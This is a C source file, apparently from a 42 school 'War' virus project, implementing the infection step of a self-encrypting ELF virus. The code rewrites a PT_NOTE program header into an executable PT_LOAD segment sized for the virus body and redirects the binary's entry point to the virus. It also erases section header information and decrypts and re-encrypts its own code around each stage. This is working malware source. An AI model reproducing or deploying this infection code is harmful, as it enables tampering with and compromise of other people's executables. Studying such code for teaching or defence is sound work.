/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:22:03 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/13 14:31:59 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

/*
  Infect() modify binary header and segment. it transform PT_NOTE into PT_LOAD
*/
__INLINE__ static Elf64_Phdr	*get_segment(t_data *data, register int off)
{
	Elf64_Phdr *ret;

   ret = (Elf64_Phdr*)(data->bin.map + (data->header->e_phoff + sizeof(Elf64_Phdr) * off));
	if (!ret || (void*)ret >= (void*)data->bin.map + data->bin.size)
		return (NULL);
	return (ret);
}

__INLINE__ static bool	is_ptnote(Elf64_Phdr *hdr)
{
	return (hdr->p_type == PT_NOTE);
}

__INLINE__ static bool	is_data(Elf64_Phdr *hdr)
{
	return ((hdr->p_type == PT_LOAD) && (hdr->p_flags == (PF_W | PF_R)));
}

void	infect(t_data *data)
{

#ifdef DEBUG
	char log[] = "infect\t\t";
	_log(log, NULL, 8, data->context);
#endif

	revert_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
	if (data->context == false)
		goto next;

	data->context = false;
	Elf64_Phdr  *tmp = NULL;
	for (register int off = 0 ; off < data->header->e_phnum ; off++)
	{
		if (!(tmp = get_segment(data, off)))
			goto next;
		if (is_ptnote(tmp) == true)
			data->virus.note = tmp;
		if (is_data(tmp) == true)
			data->virus.data = tmp;
	}

	if (data->virus.note == NULL || data->virus.data == NULL)
		goto next;

	size_t base = data->virus.data->p_vaddr + data->virus.data->p_memsz;
	size_t padd = base % data->virus.data->p_align;

	data->virus.size = (size_t)end_of_data - (size_t)start;
	data->virus.note->p_type = PT_LOAD;
	data->virus.note->p_flags = (PF_X | PF_W | PF_R);
	data->virus.note->p_filesz = data->virus.size;
	data->virus.note->p_memsz = data->virus.size;
	data->virus.note->p_align = data->virus.data->p_align;

	data->virus.note->p_offset = base - padd;
	data->virus.note->p_vaddr = base + (data->virus.data->p_align - padd);
	data->virus.note->p_paddr = data->virus.note->p_vaddr;

	data->bin_entry = data->header->e_entry;
	data->vrs_entry = data->virus.note->p_vaddr;
	data->header->e_entry = data->vrs_entry;

	data->header->e_shoff = 0;
	data->header->e_shnum = 0;
	data->header->e_shstrndx = 0;
	data->context = true;

next:

	update_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
	revert_one(&data->key, (char*)inject, (size_t)patch - (size_t)inject);
	inject(data);
}
